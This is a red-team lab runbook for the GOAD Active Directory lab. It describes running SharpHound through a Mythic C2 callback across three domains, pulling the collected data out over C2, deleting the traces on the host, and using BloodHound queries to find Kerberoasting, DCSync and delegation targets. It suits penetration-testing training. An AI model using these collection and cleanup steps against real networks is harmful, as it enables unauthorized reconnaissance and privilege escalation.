---
title: GOAD - Active Directory - BloodHound Collection
category: Active Directory
environment: GOAD
execution_context: "[MYTHIC] for SharpHound tasks, [KALI] for analysis"
privileges: Domain User (minimum for collection)
tags:
  - GOAD
  - BloodHound
  - ActiveDirectory
  - SharpHound
  - Enumeration
date_created: 2026-08-23
status: VERIFY-BEFORE-USE
---

# GOAD — BloodHound Collection

> [!WARNING]
> This documentation is for the **authorized GOAD lab environment only**.

> [!IMPORTANT]
> Confirm [[GOAD - Environment Setup and Validation]] and [[GOAD - IP Hostname Matrix]] before proceeding.
> An active Mythic callback on a GOAD Windows host is required.

---

## Objective

Collect BloodHound data from all GOAD domains for attack path analysis.

---

## Prerequisites

- [ ] Active Mythic Apollo callback on a domain-joined GOAD host
- [ ] Callback has at minimum domain user context
- [ ] SharpHound.exe uploaded to Mythic File Host (see [[Mythic - Installation and Verification]])
- [ ] GOAD VMs are running
- [ ] BloodHound and Neo4j installed on Kali for analysis

---

## Execution Context

> [!IMPORTANT]
> `execute-assembly`, `shell`, and `download` commands below are **Mythic task commands**.
> They must be issued from the Mythic UI to an active Windows callback.
> They are NOT Kali Bash commands.

---

## Step 1 — Confirm Domain Context

```
Execution Context: [MYTHIC]
Task type: shell
Host: Active GOAD Windows callback
Privileges: Domain user (minimum)
```

```
shell whoami
shell whoami /all
shell net user %USERNAME% /domain
```

**Record:**
- Current username: VERIFY
- Current domain: VERIFY
- Domain membership: VERIFY

---

## Step 2 — Collect BloodHound Data (All Domains)

Run SharpHound against each domain separately. Replace domain names with verified values from [[GOAD - IP Hostname Matrix]].

```
Execution Context: [MYTHIC]
Task type: execute-assembly
Host: Active GOAD Windows callback
Privileges: Domain User (minimum), Domain Admin for full collection
```

**Collection for sevenkingdoms.local:**

```
execute-assembly SharpHound.exe -c All -d sevenkingdoms.local --CollectAllProperties --OutputDirectory C:\Windows\Temp --OutputPrefix goad_seven
```

**Collection for north.sevenkingdoms.local:**

```
execute-assembly SharpHound.exe -c All -d north.sevenkingdoms.local --CollectAllProperties --OutputDirectory C:\Windows\Temp --OutputPrefix goad_north
```

**Collection for essos.local:**

```
execute-assembly SharpHound.exe -c All -d essos.local --CollectAllProperties --OutputDirectory C:\Windows\Temp --OutputPrefix goad_essos
```

> [!NOTE]
> Domain names above use the verified /etc/hosts topology. If your GOAD deployment uses different domain names, adjust accordingly. VERIFY against [[GOAD - IP Hostname Matrix]].

**Wait for each collection to complete before proceeding.**

---

## Step 3 — Verify Collection Output

```
Execution Context: [MYTHIC]
Task type: shell
Host: Active GOAD Windows callback
```

```
shell dir C:\Windows\Temp\goad_*.zip
```

**Expected result:** One or more `.zip` files per domain.

---

## Step 4 — Download BloodHound Data

```
Execution Context: [MYTHIC]
Task type: download
Host: Active GOAD Windows callback
```

```
download C:\Windows\Temp\goad_seven_*.zip
download C:\Windows\Temp\goad_north_*.zip
download C:\Windows\Temp\goad_essos_*.zip
```

**Files will appear in Mythic UI → Callbacks → [callback] → Files → Downloads.**

---

## Step 5 — Clean Up

```
Execution Context: [MYTHIC]
Task type: shell
Host: Active GOAD Windows callback
```

```
shell del /q /f C:\Windows\Temp\goad_*.zip
```

---

## Step 6 — Start BloodHound on Kali

```
Execution Context: [KALI]
Shell: Bash
Privileges: Normal user (neo4j) / sudo for neo4j start
```

```bash
# Start Neo4j database
sudo neo4j start

# Wait 10-15 seconds for Neo4j to initialize
sleep 15

# Start BloodHound
bloodhound --no-sandbox
```

---

## Step 7 — Import Data into BloodHound

In the BloodHound UI:
1. Click the **Upload Data** button (top right)
2. Navigate to the downloaded BloodHound zip files
3. Import each zip file (one per domain)
4. Wait for import to complete

---

## Step 8 — Key Queries to Run

After import, run these BloodHound queries:

| Query | Purpose |
|---|---|
| Find All Domain Admins | Identify DA accounts |
| Shortest Path to Domain Admin | Attack paths from current user |
| Find Kerberoastable Users | Accounts with SPNs |
| Find AS-REP Roastable Users | Accounts without preauth |
| Find Users with DCSync Privileges | DCSync attack opportunities |
| Find Computers with Unconstrained Delegation | High-value targets |

---

## Expected Results

After successful collection, BloodHound should show:
- All users in each domain
- Group memberships (including Domain Admins)
- Computer accounts
- ACL edges (attack paths)
- Trust relationships between domains

> [!TIP]
> Record the attack paths shown by BloodHound in the Evidence section of [[Operation Cypher-Knife - Findings]].

---

## Common Mistakes

- Running `execute-assembly SharpHound.exe` from a Kali terminal (it's a Mythic task)
- Forgetting to wait for SharpHound to complete before running `download`
- Importing the zip file before BloodHound is fully connected to Neo4j
- Not collecting from all three domains (GOAD has multiple domains)
- Using wrong domain name in `-d` flag — verify from `shell nltest /domain_trusts`

---

## Troubleshooting

### SharpHound exits without output

```
shell nltest /domain_trusts
```
Verify the domain names. If `-d sevenkingdoms.local` fails, try without the `-d` flag and let SharpHound auto-detect.

### BloodHound shows no data after import

Check that neo4j is running:
```bash
sudo neo4j status
sudo neo4j start
```

### execute-assembly SharpHound.exe returns .NET error

```
shell reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Release
```
If .NET 4 is not available, SharpHound may need the .NET 3.5 compatible version.

---

## Related Notes

- [[Mythic - Architecture Overview]]
- [[GOAD - IP Hostname Matrix]]
- [[GOAD - Active Directory - Inside the Domain Workflow]]
- [[GOAD - Active Directory - Kerberoasting]]
- [[GOAD - Active Directory - Domain Privilege Escalation]]
- [[GOAD - Active Directory - ACL and ACE Abuse]]
- [[GOAD - Active Directory - Delegation]]
- [[GOAD - Active Directory - Trusts]]
- [[GOAD - Active Directory - ADCS]]
- [[Operation Cypher-Knife - Findings]]
